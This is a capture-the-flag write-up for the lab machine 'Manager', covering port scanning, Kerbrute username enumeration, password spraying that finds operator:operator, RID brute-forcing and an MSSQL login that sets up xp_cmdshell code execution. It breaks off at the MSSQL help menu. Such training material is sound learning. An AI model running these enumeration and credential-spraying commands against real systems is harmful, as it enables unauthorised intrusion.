## HTB-manager

#### Nmap scan:

```
nmap -vv -sCV -p0-65535 10.129.116.131
```

#### Output:

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-25 19:49:06Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-25T19:50:37+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-10-25T19:50:36+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.116.131:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.116.131:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-25T19:45:54
| Not valid after:  2056-10-25T19:45:54
| MD5:   8556:c01b:2f8f:2f17:b679:f2cb:85fe:6c74
| SHA-1: 92e2:d27a:0cfd:b71f:2c3e:57ed:d903:da60:cfcf:765e
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQFAVLMNtmP4tK1WbF1SqTmzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYxMDI1MTk0NTU0WhgPMjA1NjEwMjUxOTQ1NTRaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN3P/Nsq
| q8y8FhiuKJiiWqZKhCLtPtrUg53G+JcbuOY2TBETG67svoDbYtycYcfsN734HZh3
| PPu3lE8ffzZuv3zE8MQ/t/KqXiJab9hJIn8ME0YsD5N77LdJtyKtVhnuSxDp5hio
| IUPhIFybgU+bnVJ/lAVBcg+mYMeFOXJiqbtgUmqz/d8EWqSpG2vMKcJKMIITzeB1
| RdSP6AV+Hv7BqElEG4droFvsrtTvp7dhpbteFT4ogj7setIJJ5I/UT5GI8WerSyK
| Tatkmqcs/1U6GNcHDFvS1tdwWsierhBoHcZW0MeJ3kQfcdEmQrVDc8PTOqM4pFyH
| tF/00eQKFaxZbm0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAZytSL94u8hcNt1uV
| mEb6L52T6/KZCR5LiZc5ovShIoSTLhN4LrYBATJvGMniloVW3NHVAGaB5z647rov
| RC15qMef1ltxEn0R48Hi+/uiHretKGd1kF4p24ezjMYX/oATRiDU+r+alLIxPXjV
| V8NYPGguNT+6+D1/abr5iZCp0Ekr4bO2YgcQxIfA/hhhEIW96UZ9euK+6zm1il+Z
| EWI7hAzxTqF5qR+xpZY1jOlW3hXcUTGz0yufoCd7l1WPEUkjmaRSLA5n0gxnIItd
| S+/VInr6CgbkBo3D+eUo2QG4Cu5je4SIPpmtYHgM8TQ33vdSVgXLQnC/SCygXhEk
| EMzd4A==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-25T19:50:37+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-25T19:50:37+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-10-25T19:50:36+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56:af22:5a3d:db67:c9bb:a439:4232:14d1
| SHA-1: 2b6d:98b3:d379:df64:59f6:c665:d4b7:53b0:faf6:e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49724/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49767/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

## User -> operator

It appears that we are working with a Domain Controller based on the existence of DNS, Kerberos and LDAP. The most likely entry points are going to be either the web server, SMB server, MSSQL server or WinRM. 

Moreover, the results strongly indicate that Active Directory Certificate Services is active, particularly the line:

```
Issuer: commonName=manager-DC01-CA/domainComponent=manager
```

However, let's first view the web server on port 80.

#### Home page:

<img src="Images/01-webpage.png" width="500">

It seems to be a generic webpage. There is no useful information in the source code, none of the links lead anywhere interesting and there are no version identifiers.

At this point, I think the best course of action is to turn our attention to enumerating usernames with Kerbrute, like so:

#### Download Kerbrute:

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
```

After trying various wordlists, we discover the format of the usernames is firstname@manager.htb, searching online we find the best wordlist for this use case is xato-net-10-million-usernames.txt.

#### Run Kerbrute with xato usernames:

```
./kerbrute_linux_amd64 userenum -d manager.htb --dc 10.129.116.131 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

#### Results:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/25/26 - Ronnie Flathers @ropnop

2026/10/25 08:53:49 >  Using KDC(s):
2026/10/25 08:53:49 >  	10.129.116.131:88

2026/10/25 08:53:51 >  [+] VALID USERNAME:	 ryan@manager.htb
2026/10/25 08:53:53 >  [+] VALID USERNAME:	 guest@manager.htb
2026/10/25 08:53:55 >  [+] VALID USERNAME:	 cheng@manager.htb
2026/10/25 08:53:56 >  [+] VALID USERNAME:	 raven@manager.htb
2026/10/25 08:54:02 >  [+] VALID USERNAME:	 administrator@manager.htb
2026/10/25 08:54:17 >  [+] VALID USERNAME:	 Ryan@manager.htb
2026/10/25 08:54:19 >  [+] VALID USERNAME:	 Raven@manager.htb
2026/10/25 08:54:26 >  [+] VALID USERNAME:	 operator@manager.htb
2026/10/25 08:55:24 >  [+] VALID USERNAME:	 Guest@manager.htb
2026/10/25 08:55:24 >  [+] VALID USERNAME:	 Administrator@manager.htb
2026/10/25 08:56:10 >  [+] VALID USERNAME:	 Cheng@manager.htb
2026/10/25 08:58:26 >  [+] VALID USERNAME:	 jinwoo@manager.htb
2026/10/25 08:58:48 >  [+] VALID USERNAME:	 RYAN@manager.htb
2026/10/25 09:00:08 >  [+] VALID USERNAME:	 RAVEN@manager.htb
2026/10/25 09:00:12 >  [+] VALID USERNAME:	 GUEST@manager.htb
2026/10/25 09:02:18 >  [+] VALID USERNAME:	 Operator@manager.htb
```

Paste these into a file and run the following commands to sort them:

```
awk -F 'USERNAME:[[:space:]]*' '{print $2}' usernames.txt | cut -d @ -f 1 | grep '^[a-z]*$' > cut_users.txt
```

#### cut_users.txt:

```
ryan
guest
cheng
raven
administrator
operator
jinwoo
```

Let's check for weak userpass combinations against smb:

```
crackmapexec smb 10.129.116.131 -u cut_users.txt -p cut_users.txt --continue-on-success | grep +
```

#### Output:

```
SMB                      10.129.116.131  445    DC01             [+] manager.htb\operator:operator
```

Interesting, now let's check if there are any useful shares with READ access:

#### Running smbclient:

```
smbclient -L \\\\10.129.116.131\\ -U "operator%operator"
```

#### Output:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share
```

Seemingly not, can we brute force the RIDs?

```
netexec smb 10.129.116.131 -u operator -p operator --rid-brute
```

#### Result:

```
SMB         10.129.116.131  445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.116.131  445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.116.131  445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.116.131  445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.116.131  445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.116.131  445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.116.131  445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

This works because each user account in Windows is given an SID (Security Identifier):

```
S-1-5-21-111-222-333-500
```

The final number (500) is called the RID (Relative Identifier). Netexec is iterating through a series of these RIDs, returning the associated username of those that exist.

Moving on, we have access to some new usernames. Lets add these to our username file:

```
cat rids.txt | cut -d \\ -f 2 | cut -d ' ' -f 1 | sed 's/^[A-Z]/\L&/' >> cut_users.txt
```

#### Result:

```
ryan
guest
cheng
raven
administrator
operator
jinwoo
zhong
cheng
ryan
raven
jinWoo
chinHae
operator
```

Let us now test the operator:operator credentials against WinRM and MSSQL:

#### WinRM:

```
crackmapexec winrm 10.129.116.131 -u operator -p operator
```

#### Output:

```
WINRM       10.129.116.131  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) 
WINRM       10.129.116.131  5985   DC01             [-] manager.htb\operator:operator
```

#### MSSQL:

```
crackmapexec mssql 10.129.116.131 -u operator -p operator
```

#### Output:

```
MSSQL       10.129.116.131  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) (EncryptionReq:False) 
MSSQL       10.129.116.131  1433   DC01             [+] manager.htb\operator:operator
```

We have found password reuse for the MSSQL service with the operator user. This is very dangerous and if an attacker can gain access to an MSSQL database, it could even lead to code execution if the db user has a privileged account. Let's log in before testing if we can get code execution using xp_cmdshell.

## operator -> raven

#### Logging into MSSQL:

```
impacket-mssqlclient manager.htb/operator:operator@10.129.116.131 -windows-auth
```

We've used Windows Authentication here because we are dealing with a domain account, rather than an SQL service user account. But I always try both, with and without this switch, just incase.

Success, we have logged in. Let's list our options:

#### Help options in MSSQL:

```
    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
